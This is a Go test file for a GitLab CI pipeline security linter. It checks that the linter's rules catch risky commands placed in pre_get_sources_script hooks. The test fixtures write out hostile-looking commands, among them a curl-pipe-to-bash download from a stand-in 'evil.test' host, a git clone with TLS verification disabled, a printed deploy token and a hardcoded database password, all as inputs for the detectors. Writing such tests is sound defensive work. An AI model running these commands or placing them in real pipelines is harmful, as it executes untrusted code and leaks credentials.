package rules

import (
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
	"gopkg.in/yaml.v3"
)

type scriptRule interface {
	Check(*yaml.Node, string) []finding.Finding
}

func runRuleSrc(t *testing.T, r scriptRule, src string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return r.Check(doc.Root, "test.yml")
}

// --- helper coverage ---

func TestEachScriptLine_VisitsHooks(t *testing.T) {
	src := `
default:
  hooks:
    pre_get_sources_script:
      - echo default-hook
job1:
  hooks:
    pre_get_sources_script:
      - echo job-hook
  script:
    - echo run
`
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	var seen []string
	EachScriptLine(doc.Root, "test.yml", func(line *yaml.Node, file, job string) {
		seen = append(seen, line.Value)
	})
	want := map[string]bool{"echo default-hook": false, "echo job-hook": false, "echo run": false}
	for _, s := range seen {
		if _, ok := want[s]; ok {
			want[s] = true
		}
	}
	for line, found := range want {
		if !found {
			t.Errorf("EachScriptLine did not visit %q", line)
		}
	}
}

func TestEachScriptBlock_VisitsHooks(t *testing.T) {
	src := `
job1:
  hooks:
    pre_get_sources_script:
      - echo a
      - echo b
`
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	blocks := 0
	EachScriptBlock(doc.Root, "test.yml", func(node *yaml.Node, file, job string) {
		blocks++
		if job != "job1" {
			t.Errorf("expected job1, got %q", job)
		}
	})
	if blocks != 1 {
		t.Fatalf("expected 1 hooks block, got %d", blocks)
	}
}

func TestCollectJobScriptLines_IncludesHooks(t *testing.T) {
	src := `
job1:
  hooks:
    pre_get_sources_script:
      - echo hook
  script:
    - echo run
`
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	var lines []string
	parser.EachJob(doc.Root, func(_ *yaml.Node, job *yaml.Node) {
		for _, n := range CollectJobScriptLines(job) {
			lines = append(lines, n.Value)
		}
	})
	hasHook := false
	for _, l := range lines {
		if l == "echo hook" {
			hasHook = true
		}
	}
	if !hasHook {
		t.Errorf("CollectJobScriptLines did not include hooks line, got %v", lines)
	}
}

// --- representative rules: a pattern flagged in script: is also flagged in hooks ---

func TestHooks_GL011_DownloadExecute(t *testing.T) {
	// EachScriptBlock-migrated rule.
	f := runRuleSrc(t, GL011, `
job1:
  hooks:
    pre_get_sources_script:
      - curl https://evil.test/x.sh | bash
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL011 to flag curl|bash in hooks, got %d", len(f))
	}
}

func TestHooks_GL042_TLSBypass_Job(t *testing.T) {
	f := runRuleSrc(t, GL042, `
job1:
  hooks:
    pre_get_sources_script:
      - git -c http.sslVerify=false clone https://example.test/repo.git
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL042 to flag TLS bypass in job hooks, got %d", len(f))
	}
}

func TestHooks_GL042_TLSBypass_Default(t *testing.T) {
	f := runRuleSrc(t, GL042, `
default:
  hooks:
    pre_get_sources_script:
      - git -c http.sslVerify=false clone https://example.test/repo.git
job1:
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL042 to flag TLS bypass in default hooks, got %d", len(f))
	}
}

func TestHooks_GL068_SetX(t *testing.T) {
	// EachScriptLine-based rule (no migration needed, covered via helper).
	f := runRuleSrc(t, GL068, `
job1:
  hooks:
    pre_get_sources_script:
      - set -x
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL068 to flag set -x in hooks, got %d", len(f))
	}
}

func TestHooks_GL022_UnpinnedInstall(t *testing.T) {
	// CollectJobScriptLines-based rule.
	f := runRuleSrc(t, GL022, `
job1:
  hooks:
    pre_get_sources_script:
      - pip install ansible
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL022 to flag unpinned install in hooks, got %d", len(f))
	}
}

func TestHooks_GL021_PrintedSecret(t *testing.T) {
	// Hand-rolled rule with block-scalar splitting + job hooks.
	f := runRuleSrc(t, GL021, `
job1:
  hooks:
    pre_get_sources_script:
      - echo $DEPLOY_TOKEN
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL021 to flag printed secret in hooks, got %d", len(f))
	}
}

func TestHooks_GL044_MRSourceSHA(t *testing.T) {
	// Hand-rolled, job-only, subset of keys + job hooks.
	f := runRuleSrc(t, GL044, `
job1:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
  hooks:
    pre_get_sources_script:
      - git checkout $CI_MERGE_REQUEST_SOURCE_BRANCH_SHA
  script:
    - echo run
`)
	if len(f) != 1 {
		t.Fatalf("expected GL044 to flag MR source SHA checkout in hooks, got %d", len(f))
	}
}

func TestHooks_GL038_HardcodedCred(t *testing.T) {
	f := runRuleSrc(t, GL038, `
default:
  hooks:
    pre_get_sources_script:
      - mysqldump --password=ExampleP4ss! mydb > dump.sql
job1:
  script:
    - echo run
`)
	if len(f) == 0 {
		t.Fatalf("expected GL038 to flag hardcoded credential in default hooks, got %d", len(f))
	}
}
